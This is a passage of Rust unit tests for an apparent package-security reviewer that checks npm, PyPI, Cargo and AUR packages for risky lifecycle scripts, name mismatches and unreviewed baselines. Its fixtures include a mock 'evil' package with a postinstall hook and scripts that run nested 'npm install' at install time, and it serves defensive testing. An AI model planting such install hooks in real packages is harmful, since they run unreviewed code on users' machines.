    fn finding(rule_id: &str, severity: crate::verdict::VerdictBand) -> crate::verdict::Finding {
        crate::verdict::Finding {
            rule_id: rule_id.to_string(),
            severity,
            title: rule_id.to_string(),
            description: rule_id.to_string(),
        }
    }

    #[test]
    fn bootstrap_hint_offers_the_policy_rule_only_when_nothing_else_is_wrong() {
        let r07 = "R07_UNREVIEWED_PREDECESSOR_BASELINE";
        let alone = bootstrap_hint(&hint_verdict(vec![finding(
            r07,
            crate::verdict::VerdictBand::Medium,
        )]))
        .expect("R07 always produces a hint");
        assert!(
            alone.contains("allow_unreviewed_baseline = true"),
            "with only the missing baseline, the policy escape must be offered: {alone}"
        );

        // A real finding above Low rides along with R07 often enough that the
        // hint must not send the user to a policy rule that cannot clear it.
        for severity in [
            crate::verdict::VerdictBand::Medium,
            crate::verdict::VerdictBand::High,
            crate::verdict::VerdictBand::Block,
        ] {
            let mixed = bootstrap_hint(&hint_verdict(vec![
                finding(r07, crate::verdict::VerdictBand::Medium),
                finding("R01_LIFECYCLE_SCRIPT_ADDED", severity),
            ]))
            .expect("R07 always produces a hint");
            assert!(
                !mixed.contains("allow_unreviewed_baseline = true"),
                "{severity:?} alongside R07 must not advertise the escape: {mixed}"
            );
            assert!(
                mixed.contains("Address the findings above first"),
                "{severity:?} alongside R07 must point at the real risk: {mixed}"
            );
        }

        // A Low finding is not "other risk": the escape still applies. The
        // rule id must be one the predicate does not already exclude, or this
        // case would pass even if the comparison were off by a band.
        for low_rule in [
            "R04_DEPENDENCY_MODIFIED",
            "R00_PKGBUILD_SCOPE",
            "R02_BINARY_BLOB_MODIFIED",
        ] {
            let low_mix = bootstrap_hint(&hint_verdict(vec![
                finding(r07, crate::verdict::VerdictBand::Medium),
                finding(low_rule, crate::verdict::VerdictBand::Low),
            ]))
            .expect("R07 always produces a hint");
            assert!(
                low_mix.contains("allow_unreviewed_baseline = true"),
                "a Low {low_rule} must not suppress the escape: {low_mix}"
            );
        }
    }

    #[test]
    fn baseline_unreadable_finding_is_high() {
        let f = baseline_unreadable_finding();
        assert_eq!(f.rule_id, "R00_BASELINE_UNREADABLE");
        assert_eq!(f.severity, crate::verdict::VerdictBand::High);
    }

    #[test]
    fn target_unreadable_pkgbuild_is_disclosed_high() {
        let f = target_unreadable_finding("permission denied");
        assert_eq!(f.rule_id, "R00_BASELINE_UNREADABLE");
        assert_eq!(f.severity, crate::verdict::VerdictBand::High);
        assert!(f.description.contains("permission denied"));

        let dir = tempfile::tempdir().unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0-1".into(),
            ..Default::default()
        };
        let manifest = crate::manifest::PackageJson {
            name: "demo".into(),
            version: "1.0-1".into(),
            ..Default::default()
        };
        let (refs, disclosure) =
            collect_install_refs(Ecosystem::Aur, dir.path(), &manifest, &delta);
        assert!(refs.is_empty());
        let finding = disclosure.expect("missing PKGBUILD must disclose, never silent allow");
        assert_eq!(finding.severity, crate::verdict::VerdictBand::High);
    }

    #[test]
    fn parses_plain_spec() {
        assert_eq!(
            parse_spec("express@4.21.2", Ecosystem::Npm).unwrap(),
            ("express".into(), "4.21.2".into())
        );
    }

    #[test]
    fn parses_scoped_spec() {
        assert_eq!(
            parse_spec("@scope/pkg@1.2.3", Ecosystem::Npm).unwrap(),
            ("@scope/pkg".into(), "1.2.3".into())
        );
    }

    #[test]
    fn rejects_missing_at() {
        assert!(parse_spec("express", Ecosystem::Npm).is_err());
    }

    #[test]
    fn rejects_bad_semver() {
        assert!(parse_spec("express@latest", Ecosystem::Npm).is_err());
    }

    #[test]
    fn chain_approval_rejects_non_y() {
        use crate::registry::{Checksum, ChecksumAlg};
        use crate::store::BaselineStore;
        fn test_baseline() -> UnreviewedBaseline {
            UnreviewedBaseline {
                version: "0.9.0".into(),
                checksum: Checksum {
                    alg: ChecksumAlg::Sha512,
                    value_hex: "aa".repeat(64),
                },
            }
        }
        for answer in ["n\n", "no\n", "N\n", "\n", "yess\n"] {
            let dir = tempfile::tempdir().unwrap();
            let db = dir.path().join("t.db");
            let store = BaselineStore::open_at(&db).unwrap();
            offer_baseline_approval_with_reader(
                &store,
                Ecosystem::Npm,
                "pkg",
                &test_baseline(),
                &mut answer.as_bytes(),
            )
            .unwrap();
            assert_eq!(
                store.known_clean(Ecosystem::Npm, "pkg", "0.9.0").unwrap(),
                None,
                "answer {answer:?} must not approve"
            );
        }

        let dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&dir.path().join("t.db")).unwrap();
        let baseline = UnreviewedBaseline {
            version: "0.9.0".into(),
            checksum: Checksum {
                alg: ChecksumAlg::Sha512,
                value_hex: "aa".repeat(64),
            },
        };
        offer_baseline_approval_with_reader(
            &store,
            Ecosystem::Npm,
            "pkg",
            &baseline,
            &mut b"".as_slice(),
        )
        .unwrap();
        assert_eq!(
            store.known_clean(Ecosystem::Npm, "pkg", "0.9.0").unwrap(),
            None,
            "EOF must decline"
        );
    }

    #[test]
    fn chain_approval_accepts_y_and_yes() {
        use crate::registry::{Checksum, ChecksumAlg};
        use crate::store::BaselineStore;
        for answer in ["y\n", "yes\n", "  Y  \n"] {
            let dir = tempfile::tempdir().unwrap();
            let db = dir.path().join("t.db");
            let store = BaselineStore::open_at(&db).unwrap();
            let baseline = UnreviewedBaseline {
                version: "0.9.0".into(),
                checksum: Checksum {
                    alg: ChecksumAlg::Sha512,
                    value_hex: "bb".repeat(64),
                },
            };
            offer_baseline_approval_with_reader(
                &store,
                Ecosystem::Npm,
                "pkg",
                &baseline,
                &mut answer.as_bytes(),
            )
            .unwrap();
            assert_eq!(
                store.known_clean(Ecosystem::Npm, "pkg", "0.9.0").unwrap(),
                Some(baseline.checksum.to_display()),
                "answer {answer:?} must approve"
            );
            assert!(
                store
                    .list_clean_versions::<semver::Version>(Ecosystem::Npm, "pkg")
                    .unwrap()
                    .iter()
                    .any(|(v, _)| v.to_string() == "0.9.0")
            );
        }
    }

    #[test]
    fn parse_spec_accepts_pypi_double_equals() {
        assert_eq!(
            parse_spec("requests==2.28.1", Ecosystem::PyPi).unwrap(),
            ("requests".into(), "2.28.1".into())
        );
        assert_eq!(
            parse_spec("my-package==1.0a1", Ecosystem::PyPi).unwrap(),
            ("my-package".into(), "1.0a1".into())
        );
    }

    #[test]
    fn flexible_spec_handles_pypi_alias() {
        use crate::registry::{Package, Release};
        struct Fake;
        impl crate::registry::Registry for Fake {
            fn ecosystem(&self) -> Ecosystem {
                Ecosystem::PyPi
            }
            fn resolve(&self, n: &str, v: &str) -> Result<Package, crate::error::BluelineError> {
                Ok(Package {
                    name: n.into(),
                    version: v.into(),
                    tarball_url: "https://example.com/pkg.whl".into(),
                    integrity: None,
                })
            }
            fn fetch_tarball(&self, _: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
                Ok(vec![])
            }
            fn list_versions(
                &self,
                _: &str,
            ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
                Ok(vec![])
            }
            fn list_releases(&self, _: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
                Ok(vec![])
            }
            fn default_version(
                &self,
                _: &str,
            ) -> Result<Option<String>, crate::error::BluelineError> {
                Ok(Some("9.9.9".into()))
            }
        }
        let reg = Fake;
        assert_eq!(
            parse_spec_flexible("requests==2.28.1", &reg).unwrap(),
            ("requests".into(), "2.28.1".into())
        );
        assert_eq!(
            parse_spec_flexible("requests", &reg).unwrap(),
            ("requests".into(), "9.9.9".into())
        );

        // parse_spec bracket / space / bad version rejection
        assert!(parse_spec("pkg[extra]==1.0.0", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg==1.0.0[extra]", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg == 1.0.0", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg==not-a-version!", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg@not-a-version!", Ecosystem::Npm).is_err());
        assert!(parse_spec("@1.0.0", Ecosystem::Npm).is_err());
        assert!(parse_spec("pkg@", Ecosystem::Npm).is_err());
        assert!(parse_spec("==1.0.0", Ecosystem::PyPi).is_err());
        assert!(parse_spec("pkg==", Ecosystem::PyPi).is_err());
        assert!(parse_spec("", Ecosystem::Npm).is_err());

        // parse_spec with PEP 440 prerelease (valid PEP 440, invalid semver)
        assert_eq!(
            parse_spec("pkg==1.0.0a1", Ecosystem::PyPi).unwrap(),
            ("pkg".into(), "1.0.0a1".into())
        );
        assert_eq!(
            parse_spec("pkg@1.0.0a1", Ecosystem::PyPi).unwrap(),
            ("pkg".into(), "1.0.0a1".into())
        );

        // prepare_extracted_root on PyPI with METADATA
        let pypi_dir = tempfile::tempdir().unwrap();
        let meta_content = "Name: my-pkg\nVersion: 1.0.0\nRequires-Dist: requests >= 2.0; python_version >= '3.8'\nRequires-Dist:   \n";
        std::fs::write(pypi_dir.path().join("METADATA"), meta_content).unwrap();
        let (_root, manifest) =
            prepare_extracted_root(pypi_dir.path(), Ecosystem::PyPi, "my-pkg", "1.0.0").unwrap();
        assert_eq!(manifest.name, "my-pkg");
        assert_eq!(manifest.version, "1.0.0");
        assert_eq!(manifest.dependencies.len(), 1);
        assert_eq!(manifest.dependencies["requests"], "requests >= 2.0");

        // extract_for_ecosystem handles PyPI sdist tar.gz correctly
        let dir = tempfile::tempdir().unwrap();
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        {
            let mut tar = tar::Builder::new(&mut enc);
            let mut header = tar::Header::new_gnu();
            header.set_path("pkg-1.0.0/a.txt").unwrap();
            header.set_size(5);
            header.set_cksum();
            tar.append(&header, &b"hello"[..]).unwrap();
            tar.finish().unwrap();
        }
        let tarball_bytes = enc.finish().unwrap();
        let res = extract_for_ecosystem(
            &tarball_bytes,
            dir.path(),
            Ecosystem::PyPi,
            "https://example.com/pkg-1.0.0.tar.gz",
        );
        assert!(res.is_ok());
    }

    #[test]
    fn prepare_extracted_root_requires_aur_archive_files() {
        let dir = tempfile::tempdir().unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("missing `PKGBUILD`"),
            "unexpected error: {err}"
        );

        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("missing `.SRCINFO`"),
            "unexpected error: {err}"
        );

        let dir2 = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir2.path().join("PKGBUILD")).unwrap();
        std::fs::write(
            dir2.path().join(".SRCINFO"),
            "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n",
        )
        .unwrap();
        let err = prepare_extracted_root(dir2.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("missing `PKGBUILD`"),
            "unexpected error: {err}"
        );

        std::fs::write(
            dir.path().join(".SRCINFO"),
            "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n",
        )
        .unwrap();
        let (root, manifest) =
            prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1").unwrap();
        assert_eq!(root, dir.path());
        assert_eq!(manifest.name, "demo");
        assert_eq!(manifest.version, "1.0-1");
    }

    #[test]
    fn prepare_extracted_root_refuses_aur_pkgbase_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=other\n").unwrap();
        std::fs::write(
            dir.path().join(".SRCINFO"),
            "pkgbase = other\n\tpkgver = 1.0\n\tpkgrel = 1\n",
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Aur, "demo", "1.0-1")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains(
                "AUR archive declares pkgbase `other` but the review resolved `demo`; refusing to review"
            ),
            "unexpected error: {err}"
        );
    }

    /// `package_json_path` descends into a single top-level directory, so a
    /// tarball rooted at `evil/` was read as `evil/package.json` and its
    /// declared name never compared to the resolved one. The allowlist, the
    /// blocklist and the baseline key are all keyed on the resolved name while
    /// the installed bytes are the attacker's, so a package that lies about
    /// its own identity passed exact-match allowlisting.
    #[test]
    fn prepare_extracted_root_refuses_npm_name_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("evil")).unwrap();
        std::fs::write(
            dir.path().join("evil/package.json"),
            br#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node x.js"}}"#,
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Npm, "innocent", "1.0.0")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains(
                "archive manifest declares `evil` but the review resolved `innocent`; refusing to review"
            ),
            "unexpected error: {err}"
        );
    }

    /// An absent `name` deserialises to `""` through `#[serde(default)]`, so a
    /// manifest with no name at all used to review cleanly.
    #[test]
    fn prepare_extracted_root_refuses_a_missing_manifest_name() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("package")).unwrap();
        std::fs::write(
            dir.path().join("package/package.json"),
            br#"{"version":"1.0.0"}"#,
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Npm, "nameless", "1.0.0")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("refusing to review"),
            "a manifest with no name must be refused, got: {err}"
        );
    }

    /// The same binding for cargo, where `[package] name` was never read. The
    /// root check passes because the directory is named for the resolved
    /// package; the manifest inside it still declares something else.
    #[test]
    fn prepare_extracted_root_refuses_cargo_name_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("demo-crate-1.0.0");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join("Cargo.toml"),
            "[package]\nname = \"other-crate\"\nversion = \"1.0.0\"\n",
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Cargo, "demo-crate", "1.0.0")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains(
                "archive manifest declares `other-crate` but the review resolved `demo-crate`; refusing to review"
            ),
            "unexpected error: {err}"
        );
    }

    /// A matching name is the happy path and must not regress into a refusal.
    #[test]
    fn prepare_extracted_root_accepts_a_matching_npm_name() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("package")).unwrap();
        std::fs::write(
            dir.path().join("package/package.json"),
            br#"{"name":"demo","version":"1.0.0"}"#,
        )
        .unwrap();
        let (_root, manifest) =
            prepare_extracted_root(dir.path(), Ecosystem::Npm, "demo", "1.0.0").unwrap();
        assert_eq!(manifest.name, "demo");
    }
}

#[cfg(test)]
mod recursive_tests {
    use super::*;
    use crate::registry::{Checksum, ChecksumAlg, Package, Release};
    use crate::store::BaselineStore;
    use std::collections::HashMap;

    struct FakeRegistry {
        packages: HashMap<String, String>,
        fetches: std::sync::Arc<std::sync::atomic::AtomicU32>,
    }

    impl FakeRegistry {
        fn new(packages: &[(&str, &str)]) -> Self {
            Self::with_counter(
                packages,
                std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0)),
            )
        }

        fn with_counter(
            packages: &[(&str, &str)],
            fetches: std::sync::Arc<std::sync::atomic::AtomicU32>,
        ) -> Self {
            Self {
                packages: packages
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect(),
                fetches,
            }
        }

        fn tarball_bytes(&self, name: &str, version: &str) -> Option<Vec<u8>> {
            let json = self.packages.get(&format!("{name}@{version}"))?;
            Some(build_npm_tarball(json))
        }
    }

    impl Registry for FakeRegistry {
        fn ecosystem(&self) -> Ecosystem {
            Ecosystem::Npm
        }
        fn resolve(
            &self,
            name: &str,
            version: &str,
        ) -> Result<Package, crate::error::BluelineError> {
            let bytes = self
                .tarball_bytes(name, version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(name.to_string()))?;
            Ok(Package {
                name: name.to_string(),
                version: version.to_string(),
                tarball_url: "https://fixture.invalid/x.tgz".to_string(),
                integrity: Some(sha512_checksum(&bytes)),
            })
        }
        fn fetch_tarball(&self, pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
            use std::sync::atomic::Ordering;
            self.fetches.fetch_add(1, Ordering::SeqCst);
            self.tarball_bytes(&pkg.name, &pkg.version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(pkg.name.clone()))
        }
        fn list_versions(
            &self,
            name: &str,
        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
            let mut versions: Vec<semver::Version> = self
                .packages
                .keys()
                .filter(|k| k.rsplit_once('@').map(|(n, _)| n == name).unwrap_or(false))
                .filter_map(|k| k.rsplit_once('@')?.1.parse().ok())
                .collect();
            versions.sort();
            Ok(versions)
        }
        fn list_releases(&self, name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
            Ok(self
                .list_versions(name)?
                .into_iter()
                .map(|v| Release {
                    version: v.to_string(),
                    yanked: false,
                    publish_time: None,
                })
                .collect())
        }
        fn default_version(
            &self,
            name: &str,
        ) -> Result<Option<String>, crate::error::BluelineError> {
            Ok(self
                .list_versions(name)?
                .iter()
                .map(|v| v.to_string())
                .next_back())
        }
    }

    struct FakePyPI {
        packages: Vec<String>,
    }

    impl FakePyPI {
        fn new(pinned_specs: &[&str]) -> Self {
            Self {
                packages: pinned_specs.iter().map(|s| s.to_string()).collect(),
            }
        }

        fn tarball_bytes(&self, name: &str, version: &str) -> Option<Vec<u8>> {
            if !self
                .packages
                .iter()
                .any(|s| s == &format!("{name}=={version}"))
            {
                return None;
            }
            let metadata = format!("Name: {name}\nVersion: {version}\n");
            Some(build_sdist_tarball(&metadata))
        }
    }

    impl Registry for FakePyPI {
        fn ecosystem(&self) -> Ecosystem {
            Ecosystem::PyPi
        }
        fn resolve(
            &self,
            name: &str,
            version: &str,
        ) -> Result<Package, crate::error::BluelineError> {
            let bytes = self
                .tarball_bytes(name, version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(name.to_string()))?;
            Ok(Package {
                name: name.to_string(),
                version: version.to_string(),
                tarball_url: format!("https://fixture.invalid/{name}-{version}.tar.gz"),
                integrity: Some(sha512_checksum(&bytes)),
            })
        }
        fn fetch_tarball(&self, pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
            self.tarball_bytes(&pkg.name, &pkg.version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(pkg.name.clone()))
        }
        fn list_versions(
            &self,
            _name: &str,
        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
            Ok(Vec::new())
        }
        fn list_releases(&self, _name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
            Ok(Vec::new())
        }
        fn default_version(
            &self,
            _name: &str,
        ) -> Result<Option<String>, crate::error::BluelineError> {
            Ok(None)
        }
    }

    fn build_sdist_tarball(metadata: &str) -> Vec<u8> {
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        {
            let mut tar = tar::Builder::new(&mut enc);
            let mut header = tar::Header::new_gnu();
            header.set_path("pkg-1.0.0/METADATA").unwrap();
            header.set_size(metadata.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append(&header, metadata.as_bytes()).unwrap();
            tar.finish().unwrap();
        }
        enc.finish().unwrap()
    }

    fn build_npm_tarball(package_json: &str) -> Vec<u8> {
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        {
            let mut tar = tar::Builder::new(&mut enc);
            let mut header = tar::Header::new_gnu();
            let path = "package/package.json";
            header.set_path(path).unwrap();
            header.set_size(package_json.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append(&header, package_json.as_bytes()).unwrap();
            tar.finish().unwrap();
        }
        enc.finish().unwrap()
    }

    fn sha512_checksum(bytes: &[u8]) -> Checksum {
        use sha2::{Digest, Sha512};
        Checksum {
            alg: ChecksumAlg::Sha512,
            value_hex: hex_encode(&Sha512::digest(bytes)),
        }
    }

    fn hex_encode(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    fn fixture_bases() -> RegistryBases {
        RegistryBases {
            npm: "http://127.0.0.1:9".to_string(),
            cargo: "http://127.0.0.1:9".to_string(),
            pypi: "http://127.0.0.1:9".to_string(),
            aur: "http://127.0.0.1:9".to_string(),
        }
    }

    fn no_advisory_policy() -> Policy {
        let mut policy = Policy::default();
        policy.policy.check_advisories = false;
        policy
    }

    fn evaluate_test(
        packages: &[(&str, &str)],
        spec: &str,
        policy: &Policy,
    ) -> (crate::verdict::Verdict, u32) {
        let (name, version) = spec.split_once('@').unwrap();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut ctx = ReviewContext::new(policy, fixture_bases());
        let registry = std::rc::Rc::new(FakeRegistry::new(packages));
        ctx.inject_registry(Ecosystem::Npm, registry.clone());
        let (verdict, _, _, _) =
            evaluate_package(name, version, Ecosystem::Npm, &store, policy, &mut ctx).unwrap();
        use std::sync::atomic::Ordering;
        (verdict, registry.fetches.load(Ordering::SeqCst))
    }

    #[test]
    fn lifecycle_reference_triggers_recursive_review() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::High),
            "expected R24 High, got {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
        assert_eq!(verdict.recursive.len(), 1);
        let child = &verdict.recursive[0];
        assert_eq!(child.name, "b");
        assert_eq!(child.version, "1.0.0");
        assert_eq!(child.chain, vec!["a@1.0.0", "npm:b@1.0.0"]);
        // A Medium child stays below the default HIGH roll-up threshold.
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R27_SECOND_ORDER"),
            "Medium child must not roll up at the HIGH threshold"
        );
    }

    #[test]
    fn child_block_band_policy_lowering_rolls_up_medium_children() {
        let mut policy = no_advisory_policy();
        policy.recursion.child_block_band = crate::verdict::VerdictBand::Medium;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        let r27 = verdict
            .findings
            .iter()
            .find(|f| f.rule_id == "R27_SECOND_ORDER")
            .expect("MEDIUM threshold rolls up the Medium child");
        assert_eq!(r27.severity, crate::verdict::VerdictBand::Medium);
    }

    #[test]
    fn repeated_reference_reuses_cached_review_after_budget_spent() {
        let mut policy = no_advisory_policy();
        policy.recursion.max_child_reviews = 1;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0","prepare":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(
            verdict.recursive.len(),
            2,
            "a cached reuse must survive budget exhaustion"
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH"),
            "reusing a completed review is not a cap violation"
        );
    }

    #[test]
    fn unpinned_reference_does_not_reuse_a_stale_pinned_review() {
        // `foo@1.0.0` is reviewed first; the bare `foo` floats and must
        // resolve the current latest (`2.0.0`) for its own review rather
        // than reusing the completed `1.0.0` review. Reusing it would vouch
        // for bytes the install never fetches.
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install foo@1.0.0 && npm install foo"}}"#,
                ),
                ("foo@1.0.0", r#"{"name":"foo","version":"1.0.0"}"#),
                ("foo@2.0.0", r#"{"name":"foo","version":"2.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(
            verdict.recursive.len(),
            2,
            "pinned and floating references must each be reviewed: {}",
            serde_json::to_string(&verdict.recursive).unwrap_or_default()
        );
        let mut versions: Vec<&str> = verdict
            .recursive
            .iter()
            .map(|c| c.version.as_str())
            .collect();
        versions.sort_unstable();
        assert_eq!(versions, ["1.0.0", "2.0.0"]);
    }

    #[test]
    fn unpinned_reference_reuses_the_exact_completed_review() {
        // When the floating reference resolves to the already-reviewed
        // release, the exact completed review is reused: one fresh review,
        // two roll-ups, no cap violation.
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install foo@1.0.0 && npm install foo"}}"#,
                ),
                ("foo@1.0.0", r#"{"name":"foo","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 2);
        assert!(
            verdict.recursive.iter().all(|c| c.version == "1.0.0"),
            "both references resolve the same release: {:?}",
            verdict
                .recursive
                .iter()
                .map(|c| &c.version)
                .collect::<Vec<_>>()
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH"),
            "reusing the exact completed review is not a cap violation"
        );
    }

    #[test]
    fn recursive_pass_runs_on_modified_lifecycle_script_with_baseline() {
        let policy = no_advisory_policy();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let old_json = r#"{"name":"a","version":"0.9.0"}"#;
        let old_tar = build_npm_tarball(old_json);
        store
            .record_verified(Ecosystem::Npm, "a", "0.9.0", &sha512_checksum(&old_tar))
            .unwrap();
        store
            .mark_clean(Ecosystem::Npm, "a", "0.9.0", &sha512_checksum(&old_tar))
            .unwrap();
        let mut ctx = ReviewContext::new(&policy, fixture_bases());
        ctx.inject_registry(
            Ecosystem::Npm,
            std::rc::Rc::new(FakeRegistry::new(&[
                ("a@0.9.0", old_json),
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ])),
        );
        let (verdict, _, _, _) =
            evaluate_package("a", "1.0.0", Ecosystem::Npm, &store, &policy, &mut ctx).unwrap();
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"),
            "R24 must fire on a baseline review too: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
        assert_eq!(verdict.recursive.len(), 1);
    }

    #[test]
    fn install_references_at_the_exact_cap_are_not_disclosed_as_overflow() {
        let policy = no_advisory_policy();
        let specs: Vec<(String, String)> = (1..=MAX_INSTALL_REFS as i64)
            .map(|i| {
                let json = format!(r#"{{"name":"p{i}","version":"1.0.0"}}"#);
                (format!("p{i}@1.0.0"), json)
            })
            .collect();
        let many = specs
            .iter()
            .map(|(k, _)| k.as_str())
            .collect::<Vec<_>>()
            .join(" ");
        let script =
            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install SPECS"}}"#
                .replace("SPECS", &many);
        let mut packages: Vec<(&str, &str)> = vec![("a@1.0.0", script.as_str())];
        packages.extend(specs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
        let (verdict, _) = evaluate_test(&packages, "a@1.0.0", &policy);
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.title == "Install-reference cap exceeded"),
            "exactly {MAX_INSTALL_REFS} references fit the cap; disclosure would be a false positive"
        );
    }

    #[test]
    fn install_reference_overflow_is_truncated_and_disclosed() {
        let policy = no_advisory_policy();
        let specs: Vec<(String, String)> = (1..=33)
            .map(|i| {
                let json = format!(r#"{{"name":"p{i}","version":"1.0.0"}}"#);
                (format!("p{i}@1.0.0"), json)
            })
            .collect();
        let many = specs
            .iter()
            .map(|(k, _)| k.as_str())
            .collect::<Vec<_>>()
            .join(" ");
        let script =
            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install SPECS"}}"#
                .replace("SPECS", &many);
        let mut packages: Vec<(&str, &str)> = vec![("a@1.0.0", script.as_str())];
        packages.extend(specs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
        let (verdict, _) = evaluate_test(&packages, "a@1.0.0", &policy);
        assert_eq!(verdict.recursive.len(), 8, "budget bounds children");
        let cap = verdict
            .findings
            .iter()
            .find(|f| f.title == "Install-reference cap exceeded")
            .expect("overflow must be disclosed");
        assert_eq!(cap.severity, crate::verdict::VerdictBand::High);
        assert!(cap.description.contains("33"), "{cap:?}");
    }

    #[test]
    fn review_children_maps_pkgbuild_refs_to_npm_and_pip_refs_to_pypi() {
        let policy = no_advisory_policy();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut ctx = ReviewContext::new(&policy, fixture_bases());
        ctx.inject_registry(
            Ecosystem::Npm,
            std::rc::Rc::new(FakeRegistry::new(&[(
                "npm-pkg@1.0.0",
                r#"{"name":"npm-pkg","version":"1.0.0"}"#,
            )])),
        );
        ctx.inject_registry(
            Ecosystem::PyPi,
            std::rc::Rc::new(FakePyPI::new(&[("pip-pkg==1.0.0")])),
        );
        let pkgbuild_ref = crate::install_ref::raw_ref(
